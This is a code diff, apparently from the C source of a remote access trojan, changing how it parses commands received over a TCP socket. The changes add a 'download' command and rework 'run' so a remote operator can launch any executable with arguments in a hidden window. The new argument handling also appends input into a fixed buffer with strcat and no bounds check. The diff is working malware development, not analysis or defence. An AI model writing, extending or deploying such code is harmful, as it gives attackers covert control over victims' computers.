@@ -20,7 +20,7 @@ ParsedCommand parsecommand(char* raw_command) {
 
     // 根据命令类型设置解析结果
     if (strcmp(cmd.params[0], "cmd") == 0) {
-        cmd.type = CMD_EXECUTE;
+        cmd.type = CMD_UNKNOWN;
     }
     else if (strcmp(cmd.params[0], "whoami") == 0) {
         cmd.type = CMD_GETHOSTNAME;
@@ -63,6 +63,9 @@ ParsedCommand parsecommand(char* raw_command) {
     }
     else if (strcmp(cmd.params[0], "getpath") == 0) {
         cmd.type = CMD_GET_APPDATA_PATH;
+    }
+    else if (strcmp(cmd.params[0], "download") == 0) {
+        cmd.type = CMD_FILE_DOWNLOAD;
     }
 
 
@@ -133,6 +136,15 @@ char* execute_parsed_command(ParsedCommand cmd, SOCKET tcpsock) {
         }
         break;
 
+    case CMD_FILE_DOWNLOAD:
+        if (!handle_file_download(cmd)) {
+            output = _strdup("[+] Handle file download success.");
+        }
+        else {
+            output = _strdup("[+] Handle file download fail.");
+        }
+        break;
+
     case CMD_KILL_PROCESS:
         output = _strdup("[!] Kill process not implemented.");
         break;
@@ -154,17 +166,25 @@ char* execute_parsed_command(ParsedCommand cmd, SOCKET tcpsock) {
         break;
 
     case CMD_RUN:
-        if (cmd.num_params >= 2) {
-            if (run_executable(cmd.params[1], SW_SHOWNORMAL) == 0) {
-                output = _strdup("Execute succeeded");
+        if (cmd.num_params >= 3) {
+            char* path = cmd.params[1];
+            char* mode = cmd.params[2];
+            char command[DEFAULT_BUFLEN] = { 0 };
+            for (int i = 3; i < cmd.num_params; i++) {
+                strcat(command, cmd.params[i]);
+                strcat(command, " ");
             }
-            else{
-                output = _strdup("Execute failed");
+
+            if (strcmp(mode, "hide") == 0) {
+                run_executable(path, command, SW_HIDE);
+            }
+            else if (strcmp(mode, "show") == 0) {
+                run_executable(path, command, SW_SHOW);
             }
 
         }
         else {
-            output = _strdup("Usage: run <executable>");
+            output = _strdup("Usage: run <path> <show/hide> [args]");
         }
         break;
 
